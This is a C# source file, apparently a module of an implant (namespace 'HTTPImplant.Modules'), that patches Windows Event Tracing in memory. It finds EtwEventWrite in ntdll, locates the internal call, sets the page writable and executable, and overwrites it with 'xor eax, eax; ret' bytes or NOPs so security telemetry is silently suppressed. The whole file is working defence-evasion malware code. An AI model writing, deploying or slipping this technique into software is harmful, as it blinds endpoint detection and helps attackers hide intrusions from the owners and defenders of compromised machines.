using System;
using System.Runtime.InteropServices;

namespace HTTPImplant.Modules
{
    public class EtwPatch
    {
        private const byte x64_CALL_INSTRUCTION_OPCODE = 0xE8;
        private const byte x64_RET_INSTRUCTION_OPCODE = 0xC3;
        private const byte x64_INT3_INSTRUCTION_OPCODE = 0xCC;
        private const byte NOP_INSTRUCTION_OPCODE = 0x90;
        private const int PATCH_SIZE = 5;

        public enum PATCH
        {
            PATCH_ETW_EVENTWRITE,
            PATCH_ETW_EVENTWRITE_FULL
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void Start()
        {
            PatchEtwpEventWriteFullStart();
        }

        public static bool PatchEtwpEventWriteFullCall(PATCH ePatch)
        {
            string functionName = ePatch == PATCH.PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull";
            IntPtr pEtwFuncAddress = GetProcAddress(GetModuleHandle("NTDLL"), functionName);

            if (pEtwFuncAddress == IntPtr.Zero)
            {
                return false;
            }

            int i = 0;
            while (true)
            {
                byte currentByte = Marshal.ReadByte(pEtwFuncAddress, i);
                byte nextByte = Marshal.ReadByte(pEtwFuncAddress, i + 1);

                if (currentByte == x64_RET_INSTRUCTION_OPCODE && nextByte == x64_INT3_INSTRUCTION_OPCODE)
                {
                    break;
                }
                i++;
            }

            while (i >= 0)
            {
                byte currentByte = Marshal.ReadByte(pEtwFuncAddress, i);
                if (currentByte == x64_CALL_INSTRUCTION_OPCODE)
                {
                    pEtwFuncAddress += i;
                    break;
                }
                i--;
            }

            if (Marshal.ReadByte(pEtwFuncAddress) != x64_CALL_INSTRUCTION_OPCODE)
            {
                return false;
            }

            uint dwOldProtection;
            if (!VirtualProtect(pEtwFuncAddress, PATCH_SIZE, 0x40, out dwOldProtection)) // PAGE_EXECUTE_READWRITE = 0x40
            {
                return false;
            }

            for (int j = 0; j < PATCH_SIZE; j++)
            {
                Marshal.WriteByte(pEtwFuncAddress, j, NOP_INSTRUCTION_OPCODE);
            }

            if (!VirtualProtect(pEtwFuncAddress, PATCH_SIZE, dwOldProtection, out dwOldProtection))
            {
                return false;
            }

            return true;
        }

        public static IntPtr FetchEtwpEventWriteFull()
        {
            IntPtr pEtwEventFunc = GetProcAddress(GetModuleHandle("NTDLL"), "EtwEventWrite");
            if (pEtwEventFunc == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            int i = 0;
            while (true)
            {
                byte currentByte = Marshal.ReadByte(pEtwEventFunc, i);
                byte nextByte = Marshal.ReadByte(pEtwEventFunc, i + 1);

                if (currentByte == x64_RET_INSTRUCTION_OPCODE && nextByte == x64_INT3_INSTRUCTION_OPCODE)
                {
                    break;
                }
                i++;
            }

            while (i >= 0)
            {
                byte currentByte = Marshal.ReadByte(pEtwEventFunc, i);
                if (currentByte == x64_CALL_INSTRUCTION_OPCODE)
                {
                    pEtwEventFunc += i;
                    break;
                }
                i--;
            }

            if (Marshal.ReadByte(pEtwEventFunc) != x64_CALL_INSTRUCTION_OPCODE)
            {
                return IntPtr.Zero;
            }

            return pEtwEventFunc;
        }

        public static bool PatchEtwpEventWriteFullStart()
        {
            IntPtr pEtwpEventWriteFull = FetchEtwpEventWriteFull();
            if (pEtwpEventWriteFull == IntPtr.Zero)
            {
                return false;
            }

            byte[] pShellcode = new byte[] { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret;

            uint dwOldProtection;
            if (!VirtualProtect(pEtwpEventWriteFull, (uint)pShellcode.Length, 0x40, out dwOldProtection)) // PAGE_EXECUTE_READWRITE = 0x40
            {
                return false;
            }

            Marshal.Copy(pShellcode, 0, pEtwpEventWriteFull, pShellcode.Length);

            if (!VirtualProtect(pEtwpEventWriteFull, (uint)pShellcode.Length, dwOldProtection, out dwOldProtection))
            {
                return false;
            }

            return true;
        }

    }
}